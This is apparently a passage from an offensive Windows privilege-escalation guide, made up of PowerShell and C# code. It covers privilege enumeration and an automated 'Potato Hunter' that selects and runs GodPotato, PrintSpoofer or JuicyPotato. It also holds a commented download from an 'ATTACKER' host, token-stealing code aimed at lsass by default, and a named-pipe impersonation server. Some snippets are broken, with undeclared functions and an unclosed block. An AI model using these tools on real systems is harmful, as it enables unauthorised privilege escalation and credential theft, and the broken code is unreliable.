        Write-Host "`n[4] WMI Token Information:" -ForegroundColor Green
        
        try {
            $wmiProcess = Get-WmiObject Win32_Process -Filter "ProcessId = $ProcessId" -ErrorAction Stop
            $owner = $wmiProcess.GetOwner()
            Write-Host "Process Owner: $($owner.Domain)\$($owner.User)" -ForegroundColor Gray
            
            # Check for token manipulation capabilities
            $tokenInfo = @"
Token Information:
  - Handle Count: $($wmiProcess.HandleCount)
  - Thread Count: $($wmiProcess.ThreadCount)
  - Working Set Size: $([math]::Round($wmiProcess.WorkingSetSize/1MB,2)) MB
  - Virtual Size: $([math]::Round($wmiProcess.VirtualSize/1MB,2)) MB
"@
            Write-Host $tokenInfo -ForegroundColor Gray
            
        } catch {
            Write-Host "Could not retrieve WMI information" -ForegroundColor Red
        }
    }
    
    # Summary
    Write-Host "`n=== Summary ===" -ForegroundColor Cyan
    $hasCriticalPriv = $whoamiOutput | Select-String -Pattern ($criticalPrivileges -join "|")
    if ($hasCriticalPriv) {
        Write-Host "[!] CRITICAL PRIVILEGES DETECTED" -ForegroundColor Red
        Write-Host "    Possible escalation vectors available" -ForegroundColor Red
    } else {
        Write-Host "[+] No critical privileges detected" -ForegroundColor Green
    }
}

# Usage
Get-TokenPrivileges -Detailed
```

### **Check All Users' Privileges**

```powershell
function Check-AllUsersPrivileges {
    Write-Host "`n=== Checking Privileges for All Users ===" -ForegroundColor Cyan
    
    # Get all logged on users
    $loggedOnUsers = query user 2>$null
    
    if ($loggedOnUsers) {
        Write-Host "Logged on users:" -ForegroundColor Yellow
        $loggedOnUsers | ForEach-Object {
            Write-Host "  $_" -ForegroundColor Gray
        }
    }
    
    # Check service accounts with privileges
    Write-Host "`n[1] Checking Service Accounts..." -ForegroundColor Green
    
    $services = Get-WmiObject Win32_Service | Where-Object {
        $_.StartName -match "LocalSystem|NetworkService|LocalService" -or
        $_.StartName -like "*\$"
    } | Select-Object Name, StartName, State, PathName -First 10
    
    if ($services) {
        Write-Host "Services running with system privileges:" -ForegroundColor Yellow
        $services | ForEach-Object {
            Write-Host "  $($_.Name) - $($_.StartName) - $($_.State)" -ForegroundColor Gray
        }
    }
    
    # Check scheduled tasks with privileges
    Write-Host "`n[2] Checking Scheduled Tasks..." -ForegroundColor Green
    
    $tasks = Get-ScheduledTask | Where-Object { 
        $_.Principal.UserId -match "SYSTEM|Administrators" 
    } | Select-Object TaskName, @{N="User";E={$_.Principal.UserId}} -First 10
    
    if ($tasks) {
        Write-Host "Tasks running with elevated privileges:" -ForegroundColor Yellow
        $tasks | ForEach-Object {
            Write-Host "  $($_.TaskName) - $($_.User)" -ForegroundColor Gray
        }
    }
    
    # Check for users with SeImpersonate privilege
    Write-Host "`n[3] Checking for SeImpersonate Privilege..." -ForegroundColor Green
    
    $impersonateUsers = @()
    
    # Check local administrators
    $admins = Get-LocalGroupMember -GroupName "Administrators" -ErrorAction SilentlyContinue
    if ($admins) {
        foreach ($admin in $admins) {
            $impersonateUsers += [PSCustomObject]@{
                User = $admin.Name
                Group = "Administrators"
                HasSeImpersonate = $true
            }
        }
    }
    
    # Check service accounts
    $serviceAccounts = Get-WmiObject Win32_Service | 
                      Where-Object { $_.StartName -notlike "LocalSystem" } |
                      Select-Object -Unique StartName
    
    foreach ($svc in $serviceAccounts) {
        if ($svc.StartName) {
            $impersonateUsers += [PSCustomObject]@{
```

```powershell
function Invoke-PotatoHunter {
    param(
        [string]$Payload = "cmd /c whoami",
        [switch]$TestOnly,
        [switch]$ForceMethod
    )
    
    Write-Host "`n=== Potato Hunter - Automatic Token Privilege Exploitation ===" -ForegroundColor Cyan
    
    # 1. Check prerequisites
    Write-Host "`n[1] Checking prerequisites..." -ForegroundColor Green
    
    # Check OS version
    $osInfo = Get-WmiObject Win32_OperatingSystem
    $osVersion = [System.Environment]::OSVersion.Version
    $buildNumber = [int]$osInfo.BuildNumber
    
    Write-Host "OS Version: $($osInfo.Caption)" -ForegroundColor Gray
    Write-Host "Build Number: $buildNumber" -ForegroundColor Gray
    
    # Check for SeImpersonate privilege
    $privileges = whoami /priv 2>$null
    $hasSeImpersonate = $privileges -match "SeImpersonatePrivilege"
    $seImpersonateEnabled = $privileges -match "SeImpersonatePrivilege.*Enabled"
    
    if ($hasSeImpersonate) {
        if ($seImpersonateEnabled) {
            Write-Host "[+] SeImpersonatePrivilege: ENABLED" -ForegroundColor Red
        } else {
            Write-Host "[+] SeImpersonatePrivilege: Assigned but disabled" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[-] SeImpersonatePrivilege: Not available" -ForegroundColor Red
        return
    }
    
    # Check for SeAssignPrimaryPrivilege
    $hasSeAssignPrimary = $privileges -match "SeAssignPrimaryPrivilege"
    if ($hasSeAssignPrimary) {
        Write-Host "[+] SeAssignPrimaryPrivilege: Available" -ForegroundColor Yellow
    }
    
    # 2. Determine which Potato to use
    Write-Host "`n[2] Determining exploit method..." -ForegroundColor Green
    
    $potatoMethod = ""
    $potatoCommand = ""
    
    if ($buildNumber -ge 22000) {
        # Windows 11 / Server 2022
        Write-Host "Detected: Windows 11/Server 2022" -ForegroundColor Yellow
        $potatoMethod = "GodPotato"
        $potatoCommand = ".\GodPotato.exe -cmd `"$Payload`""
    } elseif ($buildNumber -ge 17763) {
        # Windows 10 1809+ / Server 2019
        Write-Host "Detected: Windows 10 1809+/Server 2019" -ForegroundColor Yellow
        $potatoMethod = "PrintSpoofer"
        $potatoCommand = ".\PrintSpoofer.exe -i -c `"$Payload`""
    } elseif ($buildNumber -ge 10240) {
        # Windows 10 / Server 2016
        Write-Host "Detected: Windows 10/Server 2016" -ForegroundColor Yellow
        $potatoMethod = "JuicyPotato/RoguePotato"
        $potatoCommand = ".\JuicyPotato.exe -l 1337 -p cmd.exe -a `/c `"$Payload`" -t *"
    } else {
        # Older systems
        Write-Host "Detected: Older Windows version" -ForegroundColor Yellow
        $potatoMethod = "JuicyPotato"
        $potatoCommand = ".\JuicyPotato.exe -l 1337 -p cmd.exe -a `/c `"$Payload`" -t *"
    }
    
    Write-Host "Selected method: $potatoMethod" -ForegroundColor Cyan
    Write-Host "Command: $potatoCommand" -ForegroundColor Gray
    
    # 3. Check for available tools
    Write-Host "`n[3] Checking for available tools..." -ForegroundColor Green
    
    $availableTools = @()
    $tools = @{
        "PrintSpoofer.exe" = "PrintSpoofer"
        "JuicyPotato.exe" = "JuicyPotato"
        "RoguePotato.exe" = "RoguePotato"
        "SweetPotato.exe" = "SweetPotato"
        "GodPotato.exe" = "GodPotato"
    }
    
    foreach ($toolFile in $tools.Keys) {
        if (Test-Path $toolFile) {
            $availableTools += $tools[$toolFile]
            Write-Host "[+] Found: $($tools[$toolFile])" -ForegroundColor Green
        } else {
            Write-Host "[-] Missing: $($tools[$toolFile])" -ForegroundColor Red
        }
    }
    
    # 4. Test or execute
    if ($TestOnly) {
        Write-Host "`n[4] Test mode - not executing" -ForegroundColor Yellow
        return [PSCustomObject]@{
            Method = $potatoMethod
            Command = $potatoCommand
            ToolsAvailable = $availableTools
            HasSeImpersonate = [bool]$hasSeImpersonate
            SeImpersonateEnabled = [bool]$seImpersonateEnabled
            OSBuild = $buildNumber
        }
    } else {
        Write-Host "`n[4] Attempting exploitation..." -ForegroundColor Yellow
        
        # Check if required tool exists
        $requiredTool = switch ($potatoMethod) {
            "PrintSpoofer" { "PrintSpoofer.exe" }
            "JuicyPotato" { "JuicyPotato.exe" }
            "RoguePotato" { "RoguePotato.exe" }
            "GodPotato" { "GodPotato.exe" }
            default { "JuicyPotato.exe" }
        }
        
        if (-not (Test-Path $requiredTool)) {
            Write-Host "[!] Required tool not found: $requiredTool" -ForegroundColor Red
            Write-Host "    Attempting to download..." -ForegroundColor Yellow
            
            # Try to download (you'd need to implement this)
            # Invoke-WebRequest -Uri "http://ATTACKER/$requiredTool" -OutFile $requiredTool
            
            if (-not (Test-Path $requiredTool)) {
                Write-Host "[!] Could not obtain $requiredTool" -ForegroundColor Red
                return
            }
        }
        
        # Execute the exploit
        Write-Host "Executing: $potatoCommand" -ForegroundColor Cyan
        
        try {
            $result = Invoke-Expression $potatoCommand 2>&1
            Write-Host "Result:" -ForegroundColor Green
            $result
        } catch {
            Write-Host "Error: $_" -ForegroundColor Red
        }
    }
}
```

## **4Ô∏è‚É£ ADVANCED TOKEN MANIPULATION TECHNIQUES**

### **Token Duplication with C++/C#**

```csharp
// C# Token Duplication Example
using System;
using System.Runtime.InteropServices;

public class TokenDuplicator {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle, 
        uint DesiredAccess, 
        out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(
        IntPtr hExistingToken,
        uint dwDesiredAccess,
        IntPtr lpTokenAttributes,
        int ImpersonationLevel,
        int TokenType,
        out IntPtr phNewToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
    
    public static bool StealToken(int pid) {
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hToken = IntPtr.Zero;
        IntPtr hDupToken = IntPtr.Zero;
        
        try {
            // Open target process
            hProcess = OpenProcess(0x0400 | 0x0010, false, pid);
            if (hProcess == IntPtr.Zero) return false;
            
            // Open process token
            if (!OpenProcessToken(hProcess, 0x0002 | 0x0008, out hToken))
                return false;
            
            // Duplicate token
            if (!DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDupToken))
                return false;
            
            // Impersonate the token
            if (!ImpersonateLoggedOnUser(hDupToken))
                return false;
            
            return true;
            
        } finally {
            // Cleanup
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hDupToken != IntPtr.Zero) CloseHandle(hDupToken);
        }
    }
}
```

```powershell
# PowerShell token manipulation using .NET Reflection
function Invoke-TokenManipulation {
    param(
        [int]$ProcessId = (Get-Process -Name lsass).Id,
        [switch]$Steal,
        [switch]$Duplicate,
        [switch]$Impersonate
    )
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    
    public class TokenMagic {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle, 
            uint DesiredAccess, 
            out IntPtr TokenHandle);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint dwDesiredAccess, 
            bool bInheritHandle, 
            int dwProcessId);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        public static bool StealToken(int pid) {
            IntPtr hProcess = IntPtr.Zero;
            IntPtr hToken = IntPtr.Zero;
            
            try {
                hProcess = OpenProcess(0x0400 | 0x0010, false, pid);
                if (hProcess == IntPtr.Zero) return false;
                
                if (!OpenProcessToken(hProcess, 0x0002 | 0x0008, out hToken))
                    return false;
                
                return ImpersonateLoggedOnUser(hToken);
            } finally {
                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
            }
        }

"@
```

```powershell
function Invoke-NamedPipeImpersonation {
    param(
        [string]$PipeName = "testpipe",
        [string]$Command = "whoami"
    )
    
    Add-Type @"
    using System;
    using System.IO;
    using System.IO.Pipes;
    using System.Security.Principal;
    using System.Diagnostics;
    using System.Threading;
    
    public class PipeImpersonator {
        public static void CreateServerAndImpersonate(string pipeName, string command) {
            using (NamedPipeServerStream pipeServer = 
                new NamedPipeServerStream(
                    pipeName,
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Byte,
                    PipeOptions.Asynchronous,
                    0, 0)) {
                
                Console.WriteLine("Waiting for client connection...");
                pipeServer.WaitForConnection();
                
                Console.WriteLine("Client connected. Attempting to impersonate...");
                
                // Impersonate the client
                pipeServer.RunAsClient(() => {
                    Console.WriteLine("Impersonated as: " + 
                        WindowsIdentity.GetCurrent().Name);
                    
                    // Execute command as the impersonated user
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = $"/c {command}";
                    psi.UseShellExecute = false;
                    psi.RedirectStandardOutput = true;
                    
                    Process p = Process.Start(psi);
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    
                    Console.WriteLine("Command output:");
                    Console.WriteLine(output);
                });
            }
        }
    }
"@
    
    Write-Host "Creating named pipe server: $PipeName" -ForegroundColor Yellow
    [PipeImpersonator]::CreateServerAndImpersonate($PipeName, $Command)
}
```
